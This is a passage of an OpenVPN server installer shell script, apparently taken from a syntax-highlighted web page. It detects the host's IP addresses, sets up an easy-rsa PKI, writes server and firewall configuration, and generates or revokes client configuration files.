then</span><br><span class="line">	echo '$PATH does not include sbin. Try using "su -" instead of "su".'</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ "$EUID" -ne 0 ]]; then</span><br><span class="line">	echo "This installer needs to be run with superuser privileges."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ ! -e /dev/net/tun ]] || ! ( exec 7&lt;&gt;/dev/net/tun ) 2&gt;/dev/null; then</span><br><span class="line">	echo "The system does not have the TUN device available.</span><br><span class="line">TUN needs to be enabled before running this installer."</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">new_client () &#123;</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Generates the custom client.ovpn</span></span><br><span class="line">	&#123;</span><br><span class="line">	cat /etc/openvpn/server/client-common.txt</span><br><span class="line">	echo "&lt;ca&gt;"</span><br><span class="line">	cat /etc/openvpn/server/easy-rsa/pki/ca.crt</span><br><span class="line">	echo "&lt;/ca&gt;"</span><br><span class="line">	echo "&lt;cert&gt;"</span><br><span class="line">	sed -ne '/BEGIN CERTIFICATE/,$ p' /etc/openvpn/server/easy-rsa/pki/issued/"$client".crt</span><br><span class="line">	echo "&lt;/cert&gt;"</span><br><span class="line">	echo "&lt;key&gt;"</span><br><span class="line">	cat /etc/openvpn/server/easy-rsa/pki/private/"$client".key</span><br><span class="line">	echo "&lt;/key&gt;"</span><br><span class="line">	echo "&lt;tls-crypt&gt;"</span><br><span class="line">	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/server/tc.key</span><br><span class="line">	echo "&lt;/tls-crypt&gt;"</span><br><span class="line">	&#125; &gt; ~/"$client".ovpn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if [[ ! -e /etc/openvpn/server/server.conf ]]; then</span><br><span class="line">	clear</span><br><span class="line">	echo 'Welcome to this OpenVPN road warrior installer!'</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If system has a single IPv4, it is selected automatically. Else, ask the user</span></span><br><span class="line">	if [[ $(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]&#123;1,3&#125;)&#123;3&#125;') -eq 1 ]]; then</span><br><span class="line">		ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]&#123;1,3&#125;)&#123;3&#125;' | cut -d '/' -f 1 | grep -oE '[0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;')</span><br><span class="line">	else</span><br><span class="line">		number_of_ip=$(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]&#123;1,3&#125;)&#123;3&#125;')</span><br><span class="line">		echo</span><br><span class="line">		echo "Which IPv4 address should be used?"</span><br><span class="line">		ip -4 addr | grep inet | grep -vE '127(\.[0-9]&#123;1,3&#125;)&#123;3&#125;' | cut -d '/' -f 1 | grep -oE '[0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;' | nl -s ') '</span><br><span class="line">		read -p "IPv4 address [1]: " ip_number</span><br><span class="line">		until [[ -z "$ip_number" || "$ip_number" =~ ^[0-9]+$ &amp;&amp; "$ip_number" -le "$number_of_ip" ]]; do</span><br><span class="line">			echo "$ip_number: invalid selection."</span><br><span class="line">			read -p "IPv4 address [1]: " ip_number</span><br><span class="line">		done</span><br><span class="line">		[[ -z "$ip_number" ]] &amp;&amp; ip_number="1"</span><br><span class="line">		ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]&#123;1,3&#125;)&#123;3&#125;' | cut -d '/' -f 1 | grep -oE '[0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;' | sed -n "$ip_number"p)</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If <span class="variable">$ip</span> is a private IP address, the server must be behind NAT</span></span><br><span class="line">	if echo "$ip" | grep -qE '^(10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168)'; then</span><br><span class="line">		echo</span><br><span class="line">		echo "This server is behind NAT. What is the public IPv4 address or hostname?"</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Get public IP and sanitize with grep</span></span><br><span class="line">		get_public_ip=$(grep -m 1 -oE '^[0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;$' &lt;&lt;&lt; "$(wget -T 10 -t 1 -4qO- "http://ip1.dynupdate.no-ip.com/" || curl -m 10 -4Ls "http://ip1.dynupdate.no-ip.com/")")</span><br><span class="line">		read -p "Public IPv4 address / hostname [$get_public_ip]: " public_ip</span><br><span class="line"><span class="meta">		#</span><span class="bash"> If the checkip service is unavailable and user didn<span class="string">'t provide input, ask again</span></span></span><br><span class="line">		until [[ -n "$get_public_ip" || -n "$public_ip" ]]; do</span><br><span class="line">			echo "Invalid input."</span><br><span class="line">			read -p "Public IPv4 address / hostname: " public_ip</span><br><span class="line">		done</span><br><span class="line">		[[ -z "$public_ip" ]] &amp;&amp; public_ip="$get_public_ip"</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If system has a single IPv6, it is selected automatically</span></span><br><span class="line">	if [[ $(ip -6 addr | grep -c 'inet6 [23]') -eq 1 ]]; then</span><br><span class="line">		ip6=$(ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]&#123;0,4&#125;:)&#123;1,7&#125;[0-9a-fA-F]&#123;0,4&#125;')</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If system has multiple IPv6, ask the user to select one</span></span><br><span class="line">	if [[ $(ip -6 addr | grep -c 'inet6 [23]') -gt 1 ]]; then</span><br><span class="line">		number_of_ip6=$(ip -6 addr | grep -c 'inet6 [23]')</span><br><span class="line">		echo</span><br><span class="line">		echo "Which IPv6 address should be used?"</span><br><span class="line">		ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]&#123;0,4&#125;:)&#123;1,7&#125;[0-9a-fA-F]&#123;0,4&#125;' | nl -s ') '</span><br><span class="line">		read -p "IPv6 address [1]: " ip6_number</span><br><span class="line">		until [[ -z "$ip6_number" || "$ip6_number" =~ ^[0-9]+$ &amp;&amp; "$ip6_number" -le "$number_of_ip6" ]]; do</span><br><span class="line">			echo "$ip6_number: invalid selection."</span><br><span class="line">			read -p "IPv6 address [1]: " ip6_number</span><br><span class="line">		done</span><br><span class="line">		[[ -z "$ip6_number" ]] &amp;&amp; ip6_number="1"</span><br><span class="line">		ip6=$(ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]&#123;0,4&#125;:)&#123;1,7&#125;[0-9a-fA-F]&#123;0,4&#125;' | sed -n "$ip6_number"p)</span><br><span class="line">	fi</span><br><span class="line">	echo</span><br><span class="line">	echo "Which protocol should OpenVPN use?"</span><br><span class="line">	echo "   1) UDP (recommended)"</span><br><span class="line">	echo "   2) TCP"</span><br><span class="line">	read -p "Protocol [1]: " protocol</span><br><span class="line">	until [[ -z "$protocol" || "$protocol" =~ ^[12]$ ]]; do</span><br><span class="line">		echo "$protocol: invalid selection."</span><br><span class="line">		read -p "Protocol [1]: " protocol</span><br><span class="line">	done</span><br><span class="line">	case "$protocol" in</span><br><span class="line">		1|"") </span><br><span class="line">		protocol=udp</span><br><span class="line">		;;</span><br><span class="line">		2) </span><br><span class="line">		protocol=tcp</span><br><span class="line">		;;</span><br><span class="line">	esac</span><br><span class="line">	echo</span><br><span class="line">	echo "What port should OpenVPN listen to?"</span><br><span class="line">	read -p "Port [1194]: " port</span><br><span class="line">	until [[ -z "$port" || "$port" =~ ^[0-9]+$ &amp;&amp; "$port" -le 65535 ]]; do</span><br><span class="line">		echo "$port: invalid port."</span><br><span class="line">		read -p "Port [1194]: " port</span><br><span class="line">	done</span><br><span class="line">	[[ -z "$port" ]] &amp;&amp; port="1194"</span><br><span class="line">	echo</span><br><span class="line">	echo "Select a DNS server for the clients:"</span><br><span class="line">	echo "   1) Current system resolvers"</span><br><span class="line">	echo "   2) Google"</span><br><span class="line">	echo "   3) 1.1.1.1"</span><br><span class="line">	echo "   4) OpenDNS"</span><br><span class="line">	echo "   5) Quad9"</span><br><span class="line">	echo "   6) AdGuard"</span><br><span class="line">	read -p "DNS server [1]: " dns</span><br><span class="line">	until [[ -z "$dns" || "$dns" =~ ^[1-6]$ ]]; do</span><br><span class="line">		echo "$dns: invalid selection."</span><br><span class="line">		read -p "DNS server [1]: " dns</span><br><span class="line">	done</span><br><span class="line">	echo</span><br><span class="line">	echo "Enter a name for the first client:"</span><br><span class="line">	read -p "Name [client]: " unsanitized_client</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Allow a limited <span class="built_in">set</span> of characters to avoid conflicts</span></span><br><span class="line">	client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' &lt;&lt;&lt; "$unsanitized_client")</span><br><span class="line">	[[ -z "$client" ]] &amp;&amp; client="client"</span><br><span class="line">	echo</span><br><span class="line">	echo "OpenVPN installation is ready to begin."</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Install a firewall <span class="keyword">in</span> the rare <span class="keyword">case</span> <span class="built_in">where</span> one is not already available</span></span><br><span class="line">	if ! systemctl is-active --quiet firewalld.service &amp;&amp; ! hash iptables 2&gt;/dev/null; then</span><br><span class="line">		if [[ "$os" == "centos" || "$os" == "fedora" ]]; then</span><br><span class="line">			firewall="firewalld"</span><br><span class="line"><span class="meta">			#</span><span class="bash"> We don<span class="string">'t want to silently enable firewalld, so we give a subtle warning</span></span></span><br><span class="line"><span class="meta">			#</span><span class="bash"> If the user continues, firewalld will be installed and enabled during setup</span></span><br><span class="line">			echo "firewalld, which is required to manage routing tables, will also be installed."</span><br><span class="line">		elif [[ "$os" == "debian" || "$os" == "ubuntu" ]]; then</span><br><span class="line"><span class="meta">			#</span><span class="bash"> iptables is way less invasive than firewalld so no warning is given</span></span><br><span class="line">			firewall="iptables"</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">	read -n1 -r -p "Press any key to continue..."</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If running inside a container, <span class="built_in">disable</span> LimitNPROC to prevent conflicts</span></span><br><span class="line">	if systemd-detect-virt -cq; then</span><br><span class="line">		mkdir /etc/systemd/system/openvpn-server@server.service.d/ 2&gt;/dev/null</span><br><span class="line">		echo "[Service]</span><br><span class="line">LimitNPROC=infinity" &gt; /etc/systemd/system/openvpn-server@server.service.d/disable-limitnproc.conf</span><br><span class="line">	fi</span><br><span class="line">	if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then</span><br><span class="line">		apt-get update</span><br><span class="line">		apt-get install -y openvpn openssl ca-certificates $firewall</span><br><span class="line">	elif [[ "$os" = "centos" ]]; then</span><br><span class="line">		yum install -y epel-release</span><br><span class="line">		yum install -y openvpn openssl ca-certificates tar $firewall</span><br><span class="line">	else</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Else, OS must be Fedora</span></span><br><span class="line">		dnf install -y openvpn openssl ca-certificates tar $firewall</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If firewalld was just installed, <span class="built_in">enable</span> it</span></span><br><span class="line">	if [[ "$firewall" == "firewalld" ]]; then</span><br><span class="line">		systemctl enable --now firewalld.service</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Get easy-rsa</span></span><br><span class="line">	easy_rsa_url='https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.7/EasyRSA-3.0.7.tgz'</span><br><span class="line">	mkdir -p /etc/openvpn/server/easy-rsa/</span><br><span class="line">	&#123; wget -qO- "$easy_rsa_url" 2&gt;/dev/null || curl -sL "$easy_rsa_url" ; &#125; | tar xz -C /etc/openvpn/server/easy-rsa/ --strip-components 1</span><br><span class="line">	chown -R root:root /etc/openvpn/server/easy-rsa/</span><br><span class="line">	cd /etc/openvpn/server/easy-rsa/</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Create the PKI, <span class="built_in">set</span> up the CA and the server and client certificates</span></span><br><span class="line">	./easyrsa init-pki</span><br><span class="line">	./easyrsa --batch build-ca nopass</span><br><span class="line">	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass</span><br><span class="line">	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass</span><br><span class="line">	EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Move the stuff we need</span></span><br><span class="line">	cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem /etc/openvpn/server</span><br><span class="line"><span class="meta">	#</span><span class="bash"> CRL is <span class="built_in">read</span> with each client connection, <span class="keyword">while</span> OpenVPN is dropped to nobody</span></span><br><span class="line">	chown nobody:"$group_name" /etc/openvpn/server/crl.pem</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Without +x <span class="keyword">in</span> the directory, OpenVPN can<span class="string">'t run a stat() on the CRL file</span></span></span><br><span class="line">	chmod o+x /etc/openvpn/server/</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Generate key <span class="keyword">for</span> tls-crypt</span></span><br><span class="line">	openvpn --genkey --secret /etc/openvpn/server/tc.key</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Create the DH parameters file using the predefined ffdhe2048 group</span></span><br><span class="line">	echo '-----BEGIN DH PARAMETERS-----</span><br><span class="line">MIIBCAKCAQEA//////////+t+FRYortKmq/cViAnPTzx2LnFg84tNpWp4TZBFGQz</span><br><span class="line">+8yTnc4kmz75fS/jY2MMddj2gbICrsRhetPfHtXV/WVhJDP1H18GbtCFY2VVPe0a</span><br><span class="line">87VXE15/V8k1mE8McODmi3fipona8+/och3xWKE2rec1MKzKT0g6eXq8CrGCsyT7</span><br><span class="line">YdEIqUuyyOP7uWrat2DX9GgdT0Kj3jlN9K5W7edjcrsZCwenyO4KbXCeAvzhzffi</span><br><span class="line">7MA0BM0oNC9hkXL+nOmFg/+OTxIy7vKBg8P+OxtMb61zO7X8vC7CIAXFjvGDfRaD</span><br><span class="line">ssbzSibBsu/6iGtCOGEoXJf//////////wIBAg==</span><br><span class="line">-----END DH PARAMETERS-----' &gt; /etc/openvpn/server/dh.pem</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Generate server.conf</span></span><br><span class="line">	echo "local $ip</span><br><span class="line">port $port</span><br><span class="line">proto $protocol</span><br><span class="line">dev tun</span><br><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key</span><br><span class="line">dh dh.pem</span><br><span class="line">auth SHA512</span><br><span class="line">tls-crypt tc.key</span><br><span class="line">topology subnet</span><br><span class="line">server 10.8.0.0 255.255.255.0" &gt; /etc/openvpn/server/server.conf</span><br><span class="line"><span class="meta">	#</span><span class="bash"> IPv6</span></span><br><span class="line">	if [[ -z "$ip6" ]]; then</span><br><span class="line">		echo 'push "redirect-gateway def1 bypass-dhcp"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">	else</span><br><span class="line">		echo 'server-ipv6 fddd:1194:1194:1194::/64' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">		echo 'push "redirect-gateway def1 ipv6 bypass-dhcp"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">	fi</span><br><span class="line">	echo 'ifconfig-pool-persist ipp.txt' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line"><span class="meta">	#</span><span class="bash"> DNS</span></span><br><span class="line">	case "$dns" in</span><br><span class="line">		1|"")</span><br><span class="line"><span class="meta">			#</span><span class="bash"> Locate the proper resolv.conf</span></span><br><span class="line"><span class="meta">			#</span><span class="bash"> Needed <span class="keyword">for</span> systems running systemd-resolved</span></span><br><span class="line">			if grep -q '^nameserver 127.0.0.53' "/etc/resolv.conf"; then</span><br><span class="line">				resolv_conf="/run/systemd/resolve/resolv.conf"</span><br><span class="line">			else</span><br><span class="line">				resolv_conf="/etc/resolv.conf"</span><br><span class="line">			fi</span><br><span class="line"><span class="meta">			#</span><span class="bash"> Obtain the resolvers from resolv.conf and use them <span class="keyword">for</span> OpenVPN</span></span><br><span class="line">			grep -v '^#\|^;' "$resolv_conf" | grep '^nameserver' | grep -oE '[0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;' | while read line; do</span><br><span class="line">				echo "push \"dhcp-option DNS $line\"" &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">			done</span><br><span class="line">		;;</span><br><span class="line">		2)</span><br><span class="line">			echo 'push "dhcp-option DNS 8.8.8.8"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">			echo 'push "dhcp-option DNS 8.8.4.4"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">		;;</span><br><span class="line">		3)</span><br><span class="line">			echo 'push "dhcp-option DNS 1.1.1.1"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">			echo 'push "dhcp-option DNS 1.0.0.1"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">		;;</span><br><span class="line">		4)</span><br><span class="line">			echo 'push "dhcp-option DNS 208.67.222.222"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">			echo 'push "dhcp-option DNS 208.67.220.220"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">		;;</span><br><span class="line">		5)</span><br><span class="line">			echo 'push "dhcp-option DNS 9.9.9.9"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">			echo 'push "dhcp-option DNS 149.112.112.112"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">		;;</span><br><span class="line">		6)</span><br><span class="line">			echo 'push "dhcp-option DNS 176.103.130.130"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">			echo 'push "dhcp-option DNS 176.103.130.131"' &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">		;;</span><br><span class="line">	esac</span><br><span class="line">	echo "keepalive 10 120</span><br><span class="line">cipher AES-256-CBC</span><br><span class="line">user nobody</span><br><span class="line">group $group_name</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">status openvpn-status.log</span><br><span class="line">verb 3</span><br><span class="line">crl-verify crl.pem" &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">	if [[ "$protocol" = "udp" ]]; then</span><br><span class="line">		echo "explicit-exit-notify" &gt;&gt; /etc/openvpn/server/server.conf</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Enable net.ipv4.ip_forward <span class="keyword">for</span> the system</span></span><br><span class="line">	echo 'net.ipv4.ip_forward=1' &gt; /etc/sysctl.d/30-openvpn-forward.conf</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Enable without waiting <span class="keyword">for</span> a reboot or service restart</span></span><br><span class="line">	echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">	if [[ -n "$ip6" ]]; then</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Enable net.ipv6.conf.all.forwarding <span class="keyword">for</span> the system</span></span><br><span class="line">		echo "net.ipv6.conf.all.forwarding=1" &gt;&gt; /etc/sysctl.d/30-openvpn-forward.conf</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Enable without waiting <span class="keyword">for</span> a reboot or service restart</span></span><br><span class="line">		echo 1 &gt; /proc/sys/net/ipv6/conf/all/forwarding</span><br><span class="line">	fi</span><br><span class="line">	if systemctl is-active --quiet firewalld.service; then</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Using both permanent and not permanent rules to avoid a firewalld</span></span><br><span class="line"><span class="meta">		#</span><span class="bash"> reload.</span></span><br><span class="line"><span class="meta">		#</span><span class="bash"> We don<span class="string">'t use --add-service=openvpn because that would only work with</span></span></span><br><span class="line"><span class="meta">		#</span><span class="bash"> the default port and protocol.</span></span><br><span class="line">		firewall-cmd --add-port="$port"/"$protocol"</span><br><span class="line">		firewall-cmd --zone=trusted --add-source=10.8.0.0/24</span><br><span class="line">		firewall-cmd --permanent --add-port="$port"/"$protocol"</span><br><span class="line">		firewall-cmd --permanent --zone=trusted --add-source=10.8.0.0/24</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Set NAT <span class="keyword">for</span> the VPN subnet</span></span><br><span class="line">		firewall-cmd --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"</span><br><span class="line">		firewall-cmd --permanent --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"</span><br><span class="line">		if [[ -n "$ip6" ]]; then</span><br><span class="line">			firewall-cmd --zone=trusted --add-source=fddd:1194:1194:1194::/64</span><br><span class="line">			firewall-cmd --permanent --zone=trusted --add-source=fddd:1194:1194:1194::/64</span><br><span class="line">			firewall-cmd --direct --add-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"</span><br><span class="line">			firewall-cmd --permanent --direct --add-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"</span><br><span class="line">		fi</span><br><span class="line">	else</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Create a service to <span class="built_in">set</span> up persistent iptables rules</span></span><br><span class="line">		iptables_path=$(command -v iptables)</span><br><span class="line">		ip6tables_path=$(command -v ip6tables)</span><br><span class="line"><span class="meta">		#</span><span class="bash"> nf_tables is not available as standard <span class="keyword">in</span> OVZ kernels. So use iptables-legacy</span></span><br><span class="line"><span class="meta">		#</span><span class="bash"> <span class="keyword">if</span> we are <span class="keyword">in</span> OVZ, with a nf_tables backend and iptables-legacy is available.</span></span><br><span class="line">		if [[ $(systemd-detect-virt) == "openvz" ]] &amp;&amp; readlink -f "$(command -v iptables)" | grep -q "nft" &amp;&amp; hash iptables-legacy 2&gt;/dev/null; then</span><br><span class="line">			iptables_path=$(command -v iptables-legacy)</span><br><span class="line">			ip6tables_path=$(command -v ip6tables-legacy)</span><br><span class="line">		fi</span><br><span class="line">		echo "[Unit]</span><br><span class="line">Before=network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=$iptables_path -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $ip</span><br><span class="line">ExecStart=$iptables_path -I INPUT -p $protocol --dport $port -j ACCEPT</span><br><span class="line">ExecStart=$iptables_path -I FORWARD -s 10.8.0.0/24 -j ACCEPT</span><br><span class="line">ExecStart=$iptables_path -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">ExecStop=$iptables_path -t nat -D POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $ip</span><br><span class="line">ExecStop=$iptables_path -D INPUT -p $protocol --dport $port -j ACCEPT</span><br><span class="line">ExecStop=$iptables_path -D FORWARD -s 10.8.0.0/24 -j ACCEPT</span><br><span class="line">ExecStop=$iptables_path -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" &gt; /etc/systemd/system/openvpn-iptables.service</span><br><span class="line">		if [[ -n "$ip6" ]]; then</span><br><span class="line">			echo "ExecStart=$ip6tables_path -t nat -A POSTROUTING -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to $ip6</span><br><span class="line">ExecStart=$ip6tables_path -I FORWARD -s fddd:1194:1194:1194::/64 -j ACCEPT</span><br><span class="line">ExecStart=$ip6tables_path -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">ExecStop=$ip6tables_path -t nat -D POSTROUTING -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to $ip6</span><br><span class="line">ExecStop=$ip6tables_path -D FORWARD -s fddd:1194:1194:1194::/64 -j ACCEPT</span><br><span class="line">ExecStop=$ip6tables_path -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" &gt;&gt; /etc/systemd/system/openvpn-iptables.service</span><br><span class="line">		fi</span><br><span class="line">		echo "RemainAfterExit=yes</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target" &gt;&gt; /etc/systemd/system/openvpn-iptables.service</span><br><span class="line">		systemctl enable --now openvpn-iptables.service</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If SELinux is enabled and a custom port was selected, we need this</span></span><br><span class="line">	if sestatus 2&gt;/dev/null | grep "Current mode" | grep -q "enforcing" &amp;&amp; [[ "$port" != 1194 ]]; then</span><br><span class="line"><span class="meta">		#</span><span class="bash"> Install semanage <span class="keyword">if</span> not already present</span></span><br><span class="line">		if ! hash semanage 2&gt;/dev/null; then</span><br><span class="line">			if [[ "$os_version" -eq 7 ]]; then</span><br><span class="line">				# Centos 7</span><br><span class="line">				yum install -y policycoreutils-python</span><br><span class="line">			else</span><br><span class="line">				# CentOS 8 or Fedora</span><br><span class="line">				dnf install -y policycoreutils-python-utils</span><br><span class="line">			fi</span><br><span class="line">		fi</span><br><span class="line">		semanage port -a -t openvpn_port_t -p "$protocol" "$port"</span><br><span class="line">	fi</span><br><span class="line"><span class="meta">	#</span><span class="bash"> If the server is behind NAT, use the correct IP address</span></span><br><span class="line">	[[ -n "$public_ip" ]] &amp;&amp; ip="$public_ip"</span><br><span class="line"><span class="meta">	#</span><span class="bash"> client-common.txt is created so we have a template to add further users later</span></span><br><span class="line">	echo "client</span><br><span class="line">dev tun</span><br><span class="line">proto $protocol</span><br><span class="line">remote $ip $port</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">remote-cert-tls server</span><br><span class="line">auth SHA512</span><br><span class="line">cipher AES-256-CBC</span><br><span class="line">ignore-unknown-option block-outside-dns</span><br><span class="line">block-outside-dns</span><br><span class="line">verb 3" &gt; /etc/openvpn/server/client-common.txt</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Enable and start the OpenVPN service</span></span><br><span class="line">	systemctl enable --now openvpn-server@server.service</span><br><span class="line"><span class="meta">	#</span><span class="bash"> Generates the custom client.ovpn</span></span><br><span class="line">	new_client</span><br><span class="line">	echo</span><br><span class="line">	echo "Finished!"</span><br><span class="line">	echo</span><br><span class="line">	echo "The client configuration is available in:" ~/"$client.ovpn"</span><br><span class="line">	echo "New clients can be added by running this script again."</span><br><span class="line">else</span><br><span class="line">	clear</span><br><span class="line">	echo "OpenVPN is already installed."</span><br><span class="line">	echo</span><br><span class="line">	echo "Select an option:"</span><br><span class="line">	echo "   1) Add a new client"</span><br><span class="line">	echo "   2) Revoke an existing client"</span><br><span class="line">	echo "   3) Remove OpenVPN"</span><br><span class="line">	echo "   4) Exit"</span><br><span class="line">	read -p "Option: " option</span><br><span class="line">	until [[ "$option" =~ ^[1-4]$ ]]; do</span><br><span class="line">		echo "$option: invalid selection."</span><br><span class="line">		read -p "Option: " option</span><br><span class="line">	done</span><br><span class="line">	case "$option" in</span><br><span class="line">		1)</span><br><span class="line">			echo</span><br><span class="line">			echo "Provide a name for the client:"</span><br><span class="line">			read -p "Name: " unsanitized_client</span><br><span class="line">			client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' &lt;&lt;&lt; "$unsanitized_client")</span><br><span class="line">			while [[ -z "$client" || -e /etc/openvpn/server/easy-rsa/pki/issued/"$client".crt ]]; do</span><br><span class="line">				echo "$client: invalid name."</span><br><span class="line">				read -p "Name: " unsanitized_client</span><br><span class="line">				client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' &lt;&lt;&lt; "$unsanitized_client")</span><br><span class="line">			done</span><br><span class="line">			cd /etc/openvpn/server/easy-rsa/</span><br><span class="line">			EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass</span><br><span class="line"><span class="meta">			#</span><span class="bash"> Generates the custom client.ovpn</span></span><br><span class="line">			new_client</span><br><span class="line">			echo</span><br><span class="line">			echo "$client added. Configuration available in:" ~/"$client.ovpn"</span><br><span class="line">			exit</span><br><span class="line">		;;</span><br><span class="line">		2)</span><br><span class="line"><span class="meta">			#</span><span class="bash"> This option could be documented a bit better and maybe even be simplified</span></span><br><span class="line"><span class="meta">			#</span><span class="bash"> ...but what can I say, I want some sleep too</span></span><br><span class="line">			number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")</span><br><span class="line">			if [[ "$number_of_clients" = 0 ]]; then</span><br><span class="line">				echo</span><br><span class="line">				echo "There are no existing clients!"</span><br><span class="line">				exit</span><br><span class="line">			fi</span><br><span class="line">			echo</span><br><span class="line">			echo "Select the client to revoke:"</span><br><span class="line">			tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') '</span><br><span class="line">			read -p "Client: " client_number</span><br><span class="line">			until [[ "$client_number" =~ ^[0-9]+$ &amp;&amp; "$client_number" -le "$number_of_clients" ]]; do</span><br><span class="line">				echo "$client_number: invalid selection."</span><br><span class="line">				read -p "Client: " client_number</span><br><span class="line">			done</span><br><span class="line">			client=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed 